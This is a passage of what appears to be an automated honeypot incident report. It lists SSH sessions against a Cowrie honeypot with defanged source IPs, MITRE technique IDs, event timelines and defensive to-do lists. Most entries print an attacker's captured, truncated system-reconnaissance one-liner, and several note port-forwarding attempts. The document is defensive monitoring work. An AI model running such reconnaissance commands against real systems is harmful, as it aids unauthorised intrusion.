| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.success` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.command.input` |
| `2026-08-03 07:01:42` | `cowrie.log.closed` |
| `2026-08-03 07:01:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-233155288623

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:03 |
| **Last Seen** | 2026-08-03 07:04 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:03:57` | `cowrie.session.connect` |
| `2026-08-03 07:03:57` | `cowrie.client.version` |
| `2026-08-03 07:03:57` | `cowrie.client.kex` |
| `2026-08-03 07:03:58` | `cowrie.login.success` |
| `2026-08-03 07:03:59` | `cowrie.session.params` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.success` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.command.input` |
| `2026-08-03 07:03:59` | `cowrie.log.closed` |
| `2026-08-03 07:04:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3af5bbdca446

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-08-03 07:06 |
| **Last Seen** | 2026-08-03 07:06 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:06:01` | `cowrie.session.connect` |
| `2026-08-03 07:06:02` | `cowrie.client.version` |
| `2026-08-03 07:06:02` | `cowrie.client.kex` |
| `2026-08-03 07:06:03` | `cowrie.login.success` |
| `2026-08-03 07:06:03` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:06:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e12c15fec174

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:06 |
| **Last Seen** | 2026-08-03 07:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:06:13` | `cowrie.session.connect` |
| `2026-08-03 07:06:13` | `cowrie.client.version` |
| `2026-08-03 07:06:13` | `cowrie.client.kex` |
| `2026-08-03 07:06:14` | `cowrie.login.success` |
| `2026-08-03 07:06:15` | `cowrie.session.params` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.success` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.command.input` |
| `2026-08-03 07:06:15` | `cowrie.log.closed` |
| `2026-08-03 07:06:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e891ed5a383

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:08 |
| **Last Seen** | 2026-08-03 07:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:08:16` | `cowrie.session.connect` |
| `2026-08-03 07:08:16` | `cowrie.client.version` |
| `2026-08-03 07:08:17` | `cowrie.client.kex` |
| `2026-08-03 07:08:17` | `cowrie.login.success` |
| `2026-08-03 07:08:18` | `cowrie.session.params` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.success` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.command.input` |
| `2026-08-03 07:08:18` | `cowrie.log.closed` |
| `2026-08-03 07:08:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a739ce2510d3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:10 |
| **Last Seen** | 2026-08-03 07:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:10:16` | `cowrie.session.connect` |
| `2026-08-03 07:10:16` | `cowrie.client.version` |
| `2026-08-03 07:10:16` | `cowrie.client.kex` |
| `2026-08-03 07:10:17` | `cowrie.login.success` |
| `2026-08-03 07:10:18` | `cowrie.session.params` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.success` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.command.input` |
| `2026-08-03 07:10:18` | `cowrie.log.closed` |
| `2026-08-03 07:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a74cd5ada5a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:14 |
| **Last Seen** | 2026-08-03 07:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:14:12` | `cowrie.session.connect` |
| `2026-08-03 07:14:14` | `cowrie.client.version` |
| `2026-08-03 07:14:14` | `cowrie.client.kex` |
| `2026-08-03 07:14:15` | `cowrie.login.success` |
| `2026-08-03 07:14:16` | `cowrie.session.params` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.success` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:16` | `cowrie.command.input` |
| `2026-08-03 07:14:17` | `cowrie.log.closed` |
| `2026-08-03 07:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bf913d022eb

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:15 |
| **Last Seen** | 2026-08-03 07:15 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:15:53` | `cowrie.session.connect` |
| `2026-08-03 07:15:53` | `cowrie.client.version` |
| `2026-08-03 07:15:53` | `cowrie.client.kex` |
| `2026-08-03 07:15:54` | `cowrie.login.success` |
| `2026-08-03 07:15:55` | `cowrie.session.params` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.success` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:55` | `cowrie.command.input` |
| `2026-08-03 07:15:56` | `cowrie.log.closed` |
| `2026-08-03 07:15:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-766d7e0b996c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:17 |
| **Last Seen** | 2026-08-03 07:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:17:47` | `cowrie.session.connect` |
| `2026-08-03 07:17:47` | `cowrie.client.version` |
| `2026-08-03 07:17:47` | `cowrie.client.kex` |
| `2026-08-03 07:17:48` | `cowrie.login.success` |
| `2026-08-03 07:17:49` | `cowrie.session.params` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.success` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.command.input` |
| `2026-08-03 07:17:49` | `cowrie.log.closed` |
| `2026-08-03 07:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcc84f9e9427

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-03 07:17 |
| **Last Seen** | 2026-08-03 07:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:17:49` | `cowrie.session.connect` |
| `2026-08-03 07:17:49` | `cowrie.client.version` |
| `2026-08-03 07:17:49` | `cowrie.client.kex` |
| `2026-08-03 07:17:49` | `cowrie.login.success` |
| `2026-08-03 07:17:49` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:17:49` | `cowrie.direct-tcpip.data` |
| `2026-08-03 07:17:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-467139e6121b

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:20 |
| **Last Seen** | 2026-08-03 07:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:20:28` | `cowrie.session.connect` |
| `2026-08-03 07:20:28` | `cowrie.client.version` |
| `2026-08-03 07:20:28` | `cowrie.client.kex` |
| `2026-08-03 07:20:28` | `cowrie.login.success` |
| `2026-08-03 07:20:29` | `cowrie.session.params` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.success` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.command.input` |
| `2026-08-03 07:20:29` | `cowrie.log.closed` |
| `2026-08-03 07:20:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c09236bbfaa2

| Field | Detail |
|---|---|
| **Source IP** | `103.31.39[.]188` |
| **First Seen** | 2026-08-03 07:22 |
| **Last Seen** | 2026-08-03 07:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:22:27` | `cowrie.session.connect` |
| `2026-08-03 07:22:28` | `cowrie.client.version` |
| `2026-08-03 07:22:28` | `cowrie.client.kex` |
| `2026-08-03 07:22:29` | `cowrie.login.success` |
| `2026-08-03 07:22:30` | `cowrie.direct-tcpip.request` |
| `2026-08-03 07:22:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.31.39[.]188` to AbuseIPDB if not already reported
- [ ] Block `103.31.39[.]188` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5c27142726c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:22 |
| **Last Seen** | 2026-08-03 07:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:22:49` | `cowrie.session.connect` |
| `2026-08-03 07:22:49` | `cowrie.client.version` |
| `2026-08-03 07:22:49` | `cowrie.client.kex` |
| `2026-08-03 07:22:50` | `cowrie.login.success` |
| `2026-08-03 07:22:51` | `cowrie.session.params` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.success` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:51` | `cowrie.command.input` |
| `2026-08-03 07:22:52` | `cowrie.log.closed` |
| `2026-08-03 07:22:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51257032ee7e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:24 |
| **Last Seen** | 2026-08-03 07:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-03 07:24:42` | `cowrie.session.connect` |
| `2026-08-03 07:24:42` | `cowrie.client.version` |
| `2026-08-03 07:24:43` | `cowrie.client.kex` |
| `2026-08-03 07:24:43` | `cowrie.login.success` |
| `2026-08-03 07:24:44` | `cowrie.session.params` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.success` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:44` | `cowrie.command.input` |
| `2026-08-03 07:24:45` | `cowrie.log.closed` |
| `2026-08-03 07:24:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3b1cb967ad8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-08-03 07:26 |
| **Last Seen** | 2026-08-03 07:26 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
